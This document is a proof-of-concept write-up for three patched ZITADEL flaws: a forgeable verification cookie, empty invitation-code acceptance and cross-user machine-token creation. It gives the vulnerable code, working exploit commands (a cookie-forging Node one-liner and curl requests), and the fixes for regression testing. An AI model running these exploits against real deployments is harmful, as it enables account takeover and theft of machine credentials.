# Critical Vulnerability Proofs of Concept

## Scope and Safety

Run these proofs of concept only against an isolated ZITADEL deployment you own and are authorized to test. All commands use placeholders and are intended to verify the vulnerable pre-fix behavior and the corrected post-fix behavior.

The current working tree contains the fixes, so the attacks should now fail.

## CRITICAL-01: Forgeable User-Verification Cookie

### Vulnerable Code

- `apps/login/src/lib/verify-helper.ts`
- `apps/login/src/lib/server/password.ts`
- `apps/login/src/lib/server/passkeys.ts`

Before the fix, the login application trusted this value as proof of user verification:

```text
SHA256(userID + ":" + fingerprintID)
```

Both inputs were controlled by the HTTP client. No server secret, nonce, authenticated expiry, or server-side state was involved.

### Preconditions

- An active human user with no configured authentication methods.
- The target user ID is known.
- Access to the isolated login application.

### Generate the Forged Cookies

```bash
export TARGET_USER_ID="TARGET_USER_ID"
export ATTACKER_FINGERPRINT="attacker-controlled-fingerprint"

node -e 'const crypto=require("crypto"); const [u,f]=process.argv.slice(1); console.log(crypto.createHash("sha256").update(`${u}:${f}`).digest("hex"))' \
  "$TARGET_USER_ID" "$ATTACKER_FINGERPRINT"
```

Record the resulting hash as `FORGED_VERIFICATION_CHECK`.

The attacker then supplies these cookies to the login application:

```http
Cookie: fingerprintId=attacker-controlled-fingerprint; verificationCheck=FORGED_VERIFICATION_CHECK
```

### Password-Enrollment Attack

Using a browser or intercepted request from the isolated login UI:

1. Open the password setup flow for `TARGET_USER_ID`.
2. Replace the browser cookies with the forged values above.
3. Submit an attacker-controlled password without a verification code.

The vulnerable `changePassword` path accepted the cookie when the target had no authentication methods and invoked privileged `setUserPassword` as the login application.

### Passkey-Enrollment Attack

1. Create or obtain a session referencing the target user but without a valid authentication factor.
2. Set the forged cookies.
3. Submit the passkey registration action with the target session ID.
4. The vulnerable path requested a privileged passkey registration code and registered the attacker's authenticator.

### Vulnerable Success Indicator

- The password is changed without a reset code, or a new passkey registration code is returned.
- The attacker can authenticate as the target account.

### Fixed Behavior

The cookie is now an HMAC authenticated with a server-only secret and includes an authenticated issuance timestamp:

```text
timestamp.HMAC-SHA256(serverSecret, userID + ":" + fingerprintID + ":" + timestamp)
```

Expected result using the forged legacy cookie:

```text
verificationRequired
```

Relevant corrected files:

- `apps/login/src/lib/verification-check.ts`
- `apps/login/src/lib/verify-helper.ts`
- `apps/login/src/lib/server/register.ts`
- `apps/login/src/lib/server/verify.ts`

## CRITICAL-02: Empty Invitation Code Account Takeover

### Vulnerable Code

- `internal/crypto/code.go`
- `internal/command/user_v2_invite.go`
- `internal/api/ui/login/invite_user_handler.go`

The vulnerable comparison only ran when the submitted code was non-empty:

```go
if len(verificationCode) > 0 && code != verificationCode {
    return invalidCode
}
return nil
```

An empty code therefore verified any existing encrypted invitation code.

### Preconditions

- A pending invited human user in the isolated instance.
- The invited user's ID is known.
- A valid CSRF token obtained from the same isolated login flow.

### Request

First load the invitation page and retain its cookies and CSRF value:

```bash
export BASE_URL="https://localhost:8080"
export TARGET_USER_ID="INVITED_USER_ID"

curl --insecure --silent --show-error \
  --cookie-jar /tmp/zitadel-poc-cookies.txt \
  "$BASE_URL/ui/login/user/invite?userID=$TARGET_USER_ID"
```

Extract the deployment's CSRF field name and value from that HTML, then submit the form with an empty `code`. The HTML `required` attribute is browser-side only and can be bypassed with a direct request.

```bash
export CSRF_FIELD="CSRF_FIELD_NAME"
export CSRF_VALUE="CSRF_VALUE_FROM_FORM"
export ATTACKER_PASSWORD="Local-PoC-Password-123!"

curl --insecure --include \
  --cookie /tmp/zitadel-poc-cookies.txt \
  --cookie-jar /tmp/zitadel-poc-cookies.txt \
  --request POST "$BASE_URL/ui/login/user/invite" \
  --data-urlencode "$CSRF_FIELD=$CSRF_VALUE" \
  --data-urlencode "userID=$TARGET_USER_ID" \
  --data-urlencode "code=" \
  --data-urlencode "password=$ATTACKER_PASSWORD" \
  --data-urlencode "passwordconfirm=$ATTACKER_PASSWORD" \
  --data-urlencode "resend=false"
```

Adjust `/ui/login` if the deployment uses a different configured login path prefix.

### Vulnerable Success Indicator

- The request redirects to the next login step instead of showing an invalid-code error.
- The invitation is consumed, the email becomes verified, and the attacker password is set.

### Fixed Behavior

The same request must fail with an invalid-code response and persist an invitation verification failure.

The corrected primitive rejects empty values before decryption comparison and uses constant-time comparison:

```go
if verificationCode == "" {
    return invalidCode
}
if len(code) != len(verificationCode) || subtle.ConstantTimeCompare([]byte(code), []byte(verificationCode)) != 1 {
    return invalidCode
}
```

Relevant corrected file:

- `internal/crypto/code.go`

## CRITICAL-03: Cross-User Machine Credential Creation

### Vulnerable Code

- `internal/command/permission_checks.go`
- `internal/api/grpc/user/v2/pat.go`
- `internal/api/grpc/user/v2/key.go`
- `internal/api/grpc/user/v2/secret.go`
- `proto/zitadel/user/v2/user_service.proto`

The vulnerable permission check returned success whenever self-management was enabled, regardless of the target user:

```go
if allowSelfManagement || aggregateID == callerUserID {
    return nil
}
```

The public PAT, key, and secret handlers passed `allowSelfManagement=true` while accepting an attacker-controlled `user_id`.

### Preconditions

- Any authenticated user in the isolated instance.
- The ID of a target machine user in the same instance.
- The attacker does not have `user.write` over the target.

### PAT Creation Request

```bash
export BASE_URL="https://localhost:8080"
export ATTACKER_ACCESS_TOKEN="ATTACKER_ACCESS_TOKEN"
export TARGET_MACHINE_USER_ID="TARGET_MACHINE_USER_ID"

curl --insecure --include \
  --request POST "$BASE_URL/v2/users/$TARGET_MACHINE_USER_ID/pats" \
  --header "Authorization: Bearer $ATTACKER_ACCESS_TOKEN" \
  --header "Content-Type: application/json" \
  --data '{"expirationDate":"2099-01-01T00:00:00Z"}'
```

### Vulnerable Success Indicator

The server returns HTTP 200 with a PAT belonging to the target machine user:

```json
{
  "tokenId": "...",
  "token": "..."
}
```

The returned token can then be tested only against the isolated deployment:

```bash
export STOLEN_MACHINE_PAT="TOKEN_FROM_RESPONSE"

curl --insecure --include \
  --header "Authorization: Bearer $STOLEN_MACHINE_PAT" \
  "$BASE_URL/oidc/v1/userinfo"
```

Equivalent vulnerable operations were:

```text
POST /v2/users/{target_machine_user_id}/keys
POST /v2/users/{target_machine_user_id}/secret
```

### Fixed Behavior

An authenticated non-owner without `user.write` must receive permission denied, and no PAT, key, or secret may be created.

The corrected check allows self-management only when the target is the caller:

```go
if allowSelfManagement && aggregateID != "" && aggregateID == authz.GetCtxData(ctx).UserID {
    return nil
}
return permissionCheck(resourceOwner, aggregateID)
```

Relevant corrected file:

- `internal/command/permission_checks.go`

## Regression Verification Matrix

| PoC | Vulnerable Result | Expected Fixed Result |
|---|---|---|
| Forged verification cookie | Password/passkey enrollment succeeds | Verification is rejected |
| Empty invitation code | Invitation consumed and password set | Invalid-code error |
| Foreign machine PAT creation | HTTP 200 and target PAT returned | Permission denied |
